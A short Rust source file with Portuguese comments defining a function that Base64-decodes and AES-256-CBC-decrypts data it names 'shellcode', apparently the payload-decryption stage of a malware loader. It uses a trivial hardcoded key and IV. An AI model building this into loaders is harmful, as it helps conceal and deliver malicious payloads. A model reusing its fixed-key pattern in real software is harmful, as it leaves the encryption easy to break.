use aes::Aes256;
use cbc::cipher::{
    BlockDecryptMut,
    KeyIvInit,
};
use base64;

const AES_KEY: &[u8; 32] = b"0123456789ABCDEF0123456789ABCDEF"; // 32 bytes
const AES_IV: &[u8; 16] = b"ABCDEF0123456789";                 // 16 bytes

type Aes256CbcDec = cbc::Decryptor<Aes256>;

pub fn decrypt_shellcode(b64_data: &str) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
    // 1. Decodifica Base64
    let mut encrypted_data = base64::decode(b64_data)?;

    // 2. Inicializa o cipher com chave e IV
    let cipher = Aes256CbcDec::new_from_slices(AES_KEY, AES_IV)
        .map_err(|e| Box::<dyn std::error::Error>::from(format!("Invalid key/IV length: {:?}", e)))?;

    // 3. Decripta os dados com padding PKCS7
    let decrypted_data = cipher
        .decrypt_padded_mut::<cbc::cipher::block_padding::Pkcs7>(&mut encrypted_data)
        .map_err(|e| Box::<dyn std::error::Error>::from(format!("Decryption error: {:?}", e)))?;

    Ok(Vec::from(decrypted_data))
}